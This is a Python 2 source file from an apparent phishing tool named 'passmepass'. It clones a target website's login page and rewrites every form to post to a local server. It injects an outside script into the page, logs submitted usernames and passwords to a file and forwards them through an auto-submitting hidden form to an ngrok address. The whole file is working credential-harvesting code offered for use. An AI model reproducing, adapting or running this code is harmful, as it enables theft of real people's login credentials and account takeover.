import SocketServer
import SimpleHTTPServer
import urllib2
import os
import sys
import time
import cgi
from socket import error as socerr
from core.author import __version__
from core.author import __codename__
from core.printf import printf
from lib.bs4 import BeautifulSoup as bs

#This code(httpd.py) was created with reference to a lot of code.Thanks


class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    server_version = "passmepass %s (%s)" %(__version__, __codename__)
    def do_POST(self):
        post_request = []
        printf(1, "%s - sent POST request." %self.address_string())
        form = cgi.FieldStorage(self.rfile,
        headers=self.headers,
        environ={'REQUEST_METHOD':'POST',
                 'CONTENT_TYPE':self.headers['Content-Type'],})
        try:
            
            from core.main import url
            
            log = open("%s.log" %url.replace("https://", "").replace("http://", "").split("/")[0], "a")
            log.write("\n## %s - Data  %s\n\n" %(time.strftime("%H:%M:%S - %d/%m/%y"), url))
            
            for tag in form.list:
                tmp = str(tag).split("(")[1]
                key,value = tmp.replace(")", "").replace("\'", "").replace(",", "").split()
                post_request.append("%s %s" %(key,value))
                printf(1, "%s => %s" %(key,value))
                log.write("%s => %s\n" %(key,value))
            log.close()
            
            from core.main import ngrok
            
            create_post(url,ngrok, post_request)
            SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
        
        except socerr as e:
            printf(1, "%s ignoring ..." %str(e))
        except Exception as e:
            printf(1, "%s ignoring ..." %str(e))

    def log_message(self, format, *args):
        
        arg = format%args
        if arg.split()[1] == "/":
            printf(1, "%s - sent GET request without parameters." %self.address_string())
        else:
            if arg.split()[1].startswith("/") and "&" in arg.split()[1]:
                printf(1, "%s - sent GET request with parameters." %self.address_string())
                printf(1, "%s" %arg.split()[1])

class passmepass(object):
    
    def __init__(self, url ,port):
        from core.main import url
        from core.main import port
        self.url = url
        self.port = port
        self.httpd = None
        self.from_url = None;


    def request(self,url):

        from core.main import userAgent

        opener = urllib2.build_opener()
        opener.addheaders = [('UserAgent', userAgent),
                ("Accept", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1"),
                ("Keep-Alive", "115"),
                ("Connection", "keep-alive"),
                ("DNT", "1")]
        return opener.open(self.url).read()

    def clone(self):

        from core.main import html
        from core.main import exjs
        from core.main import files

        if not html:
            printf(1, "Try!Ng +o get %s ..."%self.url)
            printf(1,"Down10ading webpage......")
            data = self.request(self.url)

        else:
            printf(1, "Loading \'%s\' ..." %html)
            data = open(html, "r").read()

        data = bs(data, "html.parser")
        printf(1, "Modifying the HTML file ...")

        for tag in data.find_all("form"):
            tag['method'] = "post"
            tag['action'] = "redirect.html"

        for tag in data.find_all("a"):
            pass

        script = data.new_tag('script', src=exjs)
        data.html.head.insert(len(data.html.head), script)

        with open("index.html", "w") as index:
            index.write(data.prettify().encode('utf-8'))
            index.close()

    def serve(self):

        print("\033[031m[i] StArT!ng passmepass %s server oN http://localhost:%d\033[00m"%(__version__,self.port))
        self.httpd = SocketServer.TCPServer(("",self.port),handler)
        self.httpd.serve_forever()

    def cleanup(self):

        if os.path.exists("index.html"):
            printf(1, "\n[i] Running cleanup ...")
            os.remove("index.html")
        if os.path.exists("redirect.html"):
            os.remove("redirect.html")

def create_post(url,ngrok,post_request):

    printf(1,"Creat!ng h+ml....")

    with open("redirect.html","w") as re:
        re.write("<body><form id=\"firefox\" action=\"%s\" method=\"post\" >\n" %ngrok)
        for post in post_request:
            key,value = post.split()
            re.write("<input name=\"%s\" value=\"%s\" type=\"hidden\" >\n" %(key,value))
        re.write("<input name=\"login\" type=\"hidden\">")
        re.write("<script type=\"text/javascript\">document.forms[\"firefox\"].submit();</script>")
    re.close()
